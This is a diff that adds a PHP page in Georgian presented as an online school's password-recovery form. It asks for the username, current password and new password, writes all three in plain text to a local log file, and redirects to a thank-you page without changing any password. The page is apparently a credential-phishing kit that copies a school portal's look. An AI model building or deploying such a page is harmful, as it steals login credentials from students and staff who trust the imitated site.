@@ -1,0 +1,55 @@
+<?php
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST["username"];
+    $current_pass = $_POST["current-pass"];
+    $new_pass = $_POST["new-pass"];
+
+    $logfile = fopen("password_change_log.txt", "a");
+
+    if ($logfile) {
+        $log_entry = "Username: $username | Current Password: $current_pass | New Password: $new_pass" . PHP_EOL;
+
+        fwrite($logfile, $log_entry);
+
+        fclose($logfile);
+
+        header("Location: thank_you.html");
+        exit();
+    } else {
+        echo "Error: Unable to open log file.";
+    }
+}
+?>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+    <title>ონლაინ სკოლა | პაროლის აღდგენა</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="icon" type="image/x-icon" href="imgs/favicon.ico">
+</head>
+<body>
+    <img src="imgs/art-board.svg" id="art-img">
+    <img src="imgs/logo.svg" id="logo">
+    <h1 id="online-school"><b>ონლაინ სკოლა</b></h1>
+    <label id="recover"><b>პაროლის აღდგენა</b></label>
+    <input autofocus="" required="" name="username" type="text" id="username" placeholder="მომხმარებლის სახელი" autocomplete="off" class="ng-pristine ng-invalid ng-touched">
+    <br>
+    <input autofocus="" required="" name="current-pass" type="password" id="current-pass" placeholder="ამჟამინდელი პაროლი" autocomplete="off" class="ng-pristine ng-invalid ng-touched">
+    <br>
+    <input autofocus="" required="" name="new-pass" type="password" id="new-pass" placeholder="ახალი პაროლი" autocomplete="off" class="ng-pristine ng-invalid ng-touched">
+    <br>
+    <button _ngcontent-cyl-c154="" type="submit" id="confirm"> დადასტურება </button>
+    <br>
+    <br>
+    <hr>
+    <br>
+    <br>
+    <br>
+</body>
+</html>
